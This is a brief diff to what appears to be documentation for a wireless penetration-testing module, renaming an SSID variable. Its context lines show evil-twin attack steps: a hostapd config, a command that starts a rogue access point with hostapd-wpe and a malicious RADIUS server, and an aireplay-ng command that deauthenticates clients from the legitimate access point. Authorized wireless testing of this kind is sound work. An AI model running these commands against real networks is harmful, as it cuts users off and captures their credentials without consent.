@@ -41,7 +41,7 @@ auxiliary/scanner/wifi/wifi_eapol_test
 
 ```ini
 interface=$interface
-ssid=$target_ssid
+ssid=$ssid
 channel=$channel
 hw_mode=g
 wpa=2
@@ -176,7 +176,7 @@ Spoof target SSID with malicious RADIUS server.
 
 ```bash
 # Start rogue AP
-hostapd-wpe -s "$target_ssid" hostapd-wpe.conf
+hostapd-wpe -s "$ssid" hostapd-wpe.conf
 
 # Optionally deauth clients from legit AP
 aireplay-ng -0 10 -a $bssid $interface
